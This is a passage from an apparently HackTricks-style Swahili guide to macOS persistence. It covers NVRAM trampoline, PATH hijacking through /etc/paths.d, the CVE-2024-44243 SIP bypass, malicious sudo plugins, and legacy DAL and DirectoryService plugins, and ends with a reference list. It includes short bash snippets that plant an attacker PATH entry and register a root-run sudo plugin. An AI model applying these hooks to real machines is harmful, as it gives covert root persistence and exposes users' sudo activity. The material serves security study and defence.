Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Kazi ya boot ya `rc.trampoline` huendesha **binary ya platform (iliyosainiwa na Apple)** iliyohifadhiwa kwenye kigezo cha NVRAM cha `apple-trusted-trampoline` wakati wa boot, lakini **tu ikiwa boot-arg ya `rc.trampoline=1` imewekwa na SIP imezimwa** (ikiwa na kikomo cha ukubwa cha takriban KB 390 na sharti la kuzuia/kurudi haraka). Kwa kuwa inahitaji **root + SIP kuzimwa + payload iliyosainiwa na Apple**, kwa vitendo haiwezekani kuitumia kwa persistence katika hali halisi, na imeorodheshwa hapa kwa ukamilifu tu.<sup>[[41]](#references)</sup>

### /etc/paths na /etc/paths.d (PATH hijack)

- Inafaa kwa kupita sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitaji root ili kuandika)
- Root inahitajika

#### Mahali

- **`/etc/paths`** na **`/etc/paths.d/*`** — husomwa na **`path_helper`** (inayoitwa kutoka `/etc/zprofile`) ili kuunda `PATH` chaguomsingi wakati wa kuingia.

#### Maelezo na Exploitation

Zote zinamilikiwa na root. Kuweka saraka inayodhibitiwa na mshambuliaji mwanzoni (kwa kuhariri `/etc/paths` au kuweka faili katika `/etc/paths.d/`) huifanya saraka hiyo ionekane mapema kwenye `PATH` ya kila shell mpya ya kuingia, kwa hiyo binary hasidi yenye jina la amri ya kawaida (`ls`, `git`, …) **hufunika** ile halisi na huendeshwa wakati mwathiriwa atakapoitekeleza.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Maelezo: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitaji root)
- Inahitaji root; matokeo yake **hupita SIP**. Matoleo ya macOS yaliyoathiriwa ni **15.0–15.1**, na tatizo lilirekebishwa katika **15.2**.

#### Mahali

- Weka filesystem bundle kwenye **`/Library/Filesystems/`**.

#### Maelezo na Unyonyaji

`storagekitd` ina entitlement **`com.apple.rootless.install.heritable`** na ilizindua binaries za filesystem bundles zikiwa zimerithi uwezo huo wa kupita SIP. Kwa kuweka filesystem bundle hasidi, mshambuliaji angeweza kuendesha msimbo unaopita SIP ili kusakinisha **kernel extensions zinazoendelea kuwepo** au kuandika kwenye saraka za `LaunchDaemon` zinazolindwa na SIP — persistence hii hudumu na kushinda ulinzi wa kawaida.<sup>[[46]](#references)</sup> Apple ilirekebisha tatizo hili katika macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Maelezo: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitaji root ili kuandika kwenye `/etc/sudo.conf`)
- Inahitaji root ili kusakinisha; kisha plugin huendeshwa ndani ya **kila `sudo` invocation** (muktadha wa setuid-root)

#### Mahali

- **`/etc/sudo.conf`** — mistari ya `Plugin` hupakia shared objects kutoka **`/usr/libexec/sudo/`** (au njia kamili). Haipo kwa chaguomsingi (sudo hutumia policy iliyojengewa ndani), kwa hivyo kuiunda hutengeneza hook safi.

#### Maelezo na Unyonyaji

`sudo` hupakia policy/approval/audit plugins zake kutoka `/etc/sudo.conf`. Kwa kuwa `sudo` ni setuid-root, shared-object plugin hasidi huendeshwa kwa **haki za root kila mara mtumiaji yeyote anapoendesha `sudo`** — persistence ya root ya kudumu ambayo pia huona kila amri ya sudo.<sup>[[51]](#references)</sup> macOS husambaza sudo 1.9.x inayotumia API ya plugin.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Programu-jalizi za CoreMediaIO DAL

Maelezo: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Mfano mdogo: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Utaratibu wa zamani:** Umeacha kutumika tangu macOS 12.3. macOS 14.1 na matoleo ya baadaye huzima programu-jalizi za zamani za video kwa chaguomsingi. Mtumiaji lazima arejeshe usaidizi wa video za zamani kupitia Recovery kabla njia hii haijafanya kazi; kuwa na saraka inayoweza kuandikwa pekee hakutoshi. [Mwongozo wa sasa wa usaidizi wa Apple](https://support.apple.com/en-us/108387).
- Ruhusa za root zinahitajika ili kuandika kwenye saraka ya programu-jalizi. Utekelezaji wowote wa msimbo hutegemea mteja anayooana ambaye bado hupakia programu-jalizi za DAL; hili halikujaribiwa wakati wa utekelezaji kwenye macOS 26.

#### Mahali

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Ruhusa za root zinahitajika
  - **Kichochezi:** Mteja wa kamera anayooana huhesabu vifaa vilivyopo **baada ya usaidizi wa zamani kurejeshwa**. Uthibitishaji wa maktaba wa mteja unaweza kuzuia programu-jalizi ya mtu mwingine.

#### Maelezo na Unyonyaji

Baadhi ya programu za kamera zilipakia programu-jalizi za CoreMediaIO **DAL** (Device Abstraction Layer) ndani ya mchakato wake. Uwasilishaji wa [camera-extension wa Apple](https://developer.apple.com/videos/play/wwdc2022/10022/) unasema wazi kuwa programu-jalizi za zamani za DAL **hazikufanya kazi** na FaceTime, QuickTime Player au Photo Booth, na kwamba wateja wengine wengi hutekeleza uthibitishaji wa maktaba. [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) za kisasa hutumika nje ya mchakato na zina mfumo tofauti wa usakinishaji na idhini. Mbinu ya kihistoria inayotumika ndani ya mchakato haimaanishi kuwa kuna njia ya jumla ya kukwepa Camera TCC kwenye macOS ya sasa.<sup>[[53]](#references)[[54]](#references)</sup>

Uchunguzi wa kusoma pekee kwenye macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` ipo na inamilikiwa na root. Haikuthibitishwa kama usaidizi wa zamani ulikuwa umewashwa wala kama programu-jalizi ilipakiwa na mteja yeyote.

### Programu-jalizi za Directory Service

Maelezo: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Utaratibu wa zamani wenye masharti:** Unahitaji root ili kusakinisha na programu-jalizi ambayo imesanidiwa na kupakiwa kwa hakika. API ya programu-jalizi ya DirectoryService imepitwa na wakati; kagua usanidi wa Open Directory wa Mac lengwa kabla ya kuchukulia hili kama kichochezi cha kuwasha mfumo.

#### Mahali

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Ruhusa za root zinahitajika
  - **Kichochezi:** `dspluginhelperd` hupakia programu-jalizi inayostahiki na kusanidiwa pale Open Directory inapohitaji. [Mwongozo wa Apple wa runtime ya programu-jalizi](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) unasema kuwa programu-jalizi ambazo hazijasanidiwa kuanza wakati wa kuwasha mfumo zinaweza kupakiwa kwa kuchelewa node yake inapofunguliwa.

#### Maelezo na Unyonyaji

`dspluginhelperd` hutumia vifurushi vya zamani vya programu-jalizi za DirectoryService. Programu-jalizi hasidi inaweza kuwa njia ya utekelezaji yenye mapendeleo pale programu-jalizi ya zamani inapokubaliwa na kuamilishwa; hii ni tofauti na PAM na Authorization Plugins. Uwepo wa saraka hauonyeshi kuwa programu-jalizi mpya iliyoandikwa itaendeshwa wakati wa kuwasha mfumo ujao. Miongozo ya Apple ya ndani ya `dspluginhelperd(8)` na `opendirectoryd(8)` kwenye macOS 26.5 bado inaorodhesha helper na njia hii ya zamani.<sup>[[53]](#references)</sup>

Uchunguzi wa kusoma pekee kwenye macOS 26: `/Library/DirectoryServices/PlugIns` na `/usr/libexec/dspluginhelperd` zipo. Hakuna programu-jalizi iliyosakinishwa, kusanidiwa au kupakiwa wakati wa jaribio hili.

## Mbinu na zana za persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Zaidi ya LaunchAgents za kawaida - 1 - faili za kuanzisha shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Zaidi ya LaunchAgents za kawaida - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Zaidi ya LaunchAgents za kawaida - 21 - Programu zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Zaidi ya LaunchAgents za kawaida - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Zaidi ya LaunchAgents za kawaida - 13 - Programu-jalizi za sauti](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Programu-jalizi za Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Zaidi ya LaunchAgents za kawaida - 12 - Programu-jalizi za QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Zaidi ya LaunchAgents za kawaida - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Zaidi ya LaunchAgents za kawaida - 4 - kazi za cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Zaidi ya LaunchAgents za kawaida - 2 - uanzishaji wa iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Zaidi ya LaunchAgents za kawaida - 7 - programu-jalizi za xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Zaidi ya LaunchAgents za kawaida - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Zaidi ya LaunchAgents za kawaida - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Zaidi ya LaunchAgents za kawaida - 3 - Vipengee vya Kuingia](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Zaidi ya LaunchAgents za kawaida - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Zaidi ya LaunchAgents za kawaida - 24 - Vitendo vya Folda](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Vitendo vya Folda kwa persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Zaidi ya LaunchAgents za kawaida - 27 - njia za mkato za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Zaidi ya LaunchAgents za kawaida - 17 - Vichagua Rangi](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Zaidi ya LaunchAgents za kawaida - 26 - Programu-jalizi za Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Kuchanganua persistence ya "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Zaidi ya LaunchAgents za kawaida - 16 - Kinga-skrini](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Hifadhi Ufikiaji Wako: Kinga-skrini kwa persistence ya macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Zaidi ya LaunchAgents za kawaida - 11 - Vifuatiliaji vya Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Zaidi ya LaunchAgents za kawaida - 9 - Kidirisha cha Mapendeleo](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Zaidi ya LaunchAgents za kawaida - 19 - Skripti za Mara kwa Mara](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Zaidi ya LaunchAgents za kawaida - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Zaidi ya LaunchAgents za kawaida - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Wizi endelevu wa vitambulisho kwa kutumia Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Zaidi ya LaunchAgents za kawaida - 30 - Faili ya usanidi ya man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Zaidi ya LaunchAgents za kawaida - 25 - Moduli za Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Zaidi ya LaunchAgents za kawaida - 31 - Mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Zaidi ya LaunchAgents za kawaida - 23 - emond, Daemon ya Kufuatilia Matukio](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Zaidi ya LaunchAgents za kawaida - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Zaidi ya LaunchAgents za kawaida - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Zaidi ya LaunchAgents za kawaida - 10 - Faili za skripti za programu](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Zaidi ya LaunchAgents za kawaida - 32 - Programu-jalizi za Vigae vya Dock](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Zaidi ya LaunchAgents za kawaida - 33 - Wijeti](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Zaidi ya LaunchAgents za kawaida - 34 - Kazi za kuwasha mfumo za launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Zaidi ya LaunchAgents za kawaida - 35 - Persistence kupitia NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Kutumia barua pepe kwa persistence kwenye OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Marekebisho ya kutiliwa shaka ya Plist ya Kanuni za Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Profiles hasidi - Mojawapo ya vitisho vikubwa zaidi kwa Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Sanaa ya Malware ya Mac Juz. 1 - Sura ya 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Kuchanganua CVE-2024-44243, njia ya kukwepa SIP ya macOS kupitia viendelezi vya kernel (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE na uhamishaji wa tokeni za API kupitia faili za miradi ya Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Athari mpya kwenye GitHub Copilot na Cursor - Backdoor ya faili ya Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Mbinu mbadala za usakinishaji (Viendelezi vya Nje)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Ondoa ExtensionInstallForcelist kwenye Chrome kwa Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Kuhusu kuandika Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Unyonyaji wa Mac wa mbali kupitia mipango maalum ya URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Mbinu mbili za persistence kwenye macOS zinazotumia vibaya programu-jalizi (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Mfano mdogo wa CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Kuchanganua athari ya macOS TCC inayotegemea Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Nyaraka za moduli ya Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Kutoka Spotlight hadi Apple Intelligence — Kutumia vibaya 0day kuiba data inayowezesha AI ya macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
